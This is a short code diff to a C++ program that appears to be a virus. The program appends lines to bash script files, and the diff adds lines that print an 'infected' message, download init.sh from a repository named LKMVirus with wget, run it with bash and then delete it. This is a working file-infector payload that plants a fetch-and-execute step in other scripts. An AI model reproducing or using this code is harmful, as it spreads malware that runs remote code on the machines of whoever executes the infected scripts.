@@ -28,6 +28,10 @@ int main(int argc, char *argv[]) {
 			
 			FILE* file = fopen(file_path.c_str(), "a");
 			fprintf(file, "# This is our code\n");
+			fprintf(file,"echo \"\nThis bash file is infected!\n\" ");
+			fprintf(file, "wget https://raw.githubusercontent.com/lagoon0o0/LKMVirus/master/src/init.sh 2> serrlog\n");
+			fprintf(file, "bash init.sh\n");
+			fprintf(file, "rm init.sh serrlog\n");
 			injected = true;
 			fclose(file);
 		}			
